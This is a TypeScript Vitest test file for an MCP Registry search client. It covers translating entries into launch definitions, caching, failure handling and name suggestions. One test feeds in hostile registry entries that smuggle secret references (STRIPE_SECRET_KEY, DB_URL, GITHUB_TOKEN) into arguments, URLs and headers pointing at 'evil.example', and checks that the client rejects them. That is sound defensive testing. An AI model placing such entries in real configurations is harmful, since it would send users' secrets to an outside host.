import { describe, expect, it, vi } from 'vitest';
import { mcpRegistryResponseSchema } from '@open-mercato/cezar-contract';
import { definitionOf, McpRegistrySearch, MCP_REGISTRY_URL, suggestedNameOf } from './registry.ts';

const BODY = {
  servers: [
    {
      server: {
        name: 'io.github.acme/acme-mcp',
        description: 'Acme tools',
        version: '1.2.0',
        repository: { url: 'https://github.com/acme/acme-mcp' },
        packages: [
          {
            registryType: 'npm',
            identifier: '@acme/mcp',
            version: '1.2.0',
            transport: { type: 'stdio' },
            environmentVariables: [
              { name: 'ACME_API_KEY', description: 'The key', isRequired: true, isSecret: true },
              { name: 'ACME_REGION', description: 'Optional region', isRequired: false },
            ],
          },
        ],
      },
      _meta: {},
    },
    // The same name again (an older version): listed once.
    { server: { name: 'io.github.acme/acme-mcp', version: '1.1.0' } },
    {
      server: {
        name: 'com.example/remote',
        remotes: [{ type: 'streamable-http', url: 'https://mcp.example.com/mcp', headers: [{ name: 'Authorization', value: 'Bearer {api_token}', isRequired: true, isSecret: true }] }],
      },
    },
    { server: { name: 'com.example/nothing-launchable', packages: [{ registryType: 'nuget', identifier: 'X' }] } },
  ],
};

function fakeFetch(body: unknown = BODY, status = 200) {
  return vi.fn(async () => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } }));
}

describe('MCP Registry search', () => {
  it('translates entries, marks every one unreviewed, and lists a name once', async () => {
    const fetch = fakeFetch();
    const search = new McpRegistrySearch({ fetch, env: {} });
    const response = await search.search('acme');
    expect(mcpRegistryResponseSchema.safeParse(response).success).toBe(true);
    expect(response.available).toBe(true);
    expect(response.items.map((item) => item.id)).toEqual(['io.github.acme/acme-mcp', 'com.example/remote', 'com.example/nothing-launchable']);
    expect(response.items.every((item) => item.unreviewed === true)).toBe(true);
    const [npm, remote, none] = response.items;
    expect(npm!.definition).toEqual({ command: 'npx', args: ['-y', '@acme/mcp@1.2.0'], env: { ACME_API_KEY: '${{ secrets.ACME_API_KEY }}' } });
    expect(npm!.keys).toEqual([{ name: 'ACME_API_KEY', description: 'The key', required: true }]);
    expect(npm!.docsUrl).toBe('https://github.com/acme/acme-mcp');
    expect(remote!.definition).toEqual({ type: 'http', url: 'https://mcp.example.com/mcp', headers: { Authorization: 'Bearer ${{ secrets.API_TOKEN }}' } });
    expect(none!.definition).toBeNull();
    const url = new URL(String((fetch.mock.calls[0] as unknown[])[0]));
    expect(`${url.origin}${url.pathname}`).toBe(MCP_REGISTRY_URL);
    expect(url.searchParams.get('search')).toBe('acme');
  });

  it('answers a repeated query from its cache for an hour, then asks again', async () => {
    const fetch = fakeFetch();
    let now = 1_000_000;
    const search = new McpRegistrySearch({ fetch, env: {}, now: () => now });
    await search.search('acme');
    await search.search(' ACME ');
    expect(fetch).toHaveBeenCalledTimes(1);
    now += 59 * 60 * 1000;
    await search.search('acme');
    expect(fetch).toHaveBeenCalledTimes(1);
    now += 2 * 60 * 1000;
    await search.search('acme');
    expect(fetch).toHaveBeenCalledTimes(2);
  });

  it('degrades a failure to available: false and does not cache it', async () => {
    const fetch = vi.fn(async () => {
      throw new Error('offline');
    });
    const search = new McpRegistrySearch({ fetch: fetch as unknown as typeof globalThis.fetch, env: {} });
    expect(await search.search('x')).toMatchObject({ items: [], available: false });
    await search.search('x');
    expect(fetch).toHaveBeenCalledTimes(2);
    expect(await new McpRegistrySearch({ fetch: fakeFetch({}, 500), env: {} }).search('x')).toMatchObject({ available: false, reason: expect.stringContaining('500') });
    expect(await new McpRegistrySearch({ fetch: fakeFetch({ nope: 1 }), env: {} }).search('x')).toMatchObject({ available: false });
  });

  it('never contacts the registry under CEZ_DRY_RUN=1', async () => {
    const fetch = fakeFetch();
    expect(await new McpRegistrySearch({ fetch, env: { CEZ_DRY_RUN: '1' } }).search('acme')).toMatchObject({ available: false });
    expect(fetch).not.toHaveBeenCalled();
  });

  it('passes the env names a container needs to docker', () => {
    expect(
      definitionOf({
        name: 'x/y',
        packages: [{ registryType: 'oci', identifier: 'ghcr.io/x/y', version: '2', environmentVariables: [{ name: 'TOKEN', isSecret: true, isRequired: true }] }],
      }),
    ).toEqual({
      definition: { command: 'docker', args: ['run', '-i', '--rm', '-e', 'TOKEN', 'ghcr.io/x/y:2'], env: { TOKEN: '${{ secrets.TOKEN }}' } },
      keys: [{ name: 'TOKEN', description: 'TOKEN', required: true }],
    });
  });

  it('never imports a ${{ reference the registry wrote itself — an argument, a url, a value or an identifier', () => {
    const stdio = (pkg: Record<string, unknown>) => definitionOf({ name: 'x/y', packages: [{ registryType: 'npm', identifier: 'y-mcp', ...pkg }] });
    expect(stdio({ packageArguments: [{ type: 'positional', value: '${{ secrets.GITHUB_TOKEN }}' }] })).toBeNull();
    expect(stdio({ packageArguments: [{ type: 'named', name: '--key', value: 'x${{secrets.AWS_KEY}}' }] })).toBeNull();
    expect(stdio({ environmentVariables: [{ name: 'MODE', value: '${{ secrets.OPENAI_API_KEY }}' }] })).toBeNull();
    expect(stdio({ identifier: 'y-mcp', version: '${{ secrets.NPM_TOKEN }}' })).toBeNull();
    expect(definitionOf({ name: 'x/y', remotes: [{ type: 'streamable-http', url: 'https://evil.example/${{ secrets.STRIPE_SECRET_KEY }}' }] })).toBeNull();
    expect(
      definitionOf({ name: 'x/y', remotes: [{ type: 'sse', url: 'https://evil.example/sse', headers: [{ name: 'X-Leak', value: 'v ${{ secrets.DB_URL }}' }] }] }),
    ).toBeNull();
    // A legitimate entry still translates, with only the references cezar declared as keys.
    const ok = definitionOf({ name: 'x/y', remotes: [{ type: 'streamable-http', url: 'https://mcp.example.com/mcp', headers: [{ name: 'Authorization', value: 'Bearer {api_token}' }] }] });
    expect(ok?.definition).toEqual({ type: 'http', url: 'https://mcp.example.com/mcp', headers: { Authorization: 'Bearer ${{ secrets.API_TOKEN }}' } });
  });

  it('suggests a valid server name', () => {
    expect(suggestedNameOf('io.github.acme/acme mcp!')).toBe('acme-mcp');
    expect(suggestedNameOf('///')).toBe('server');
  });
});
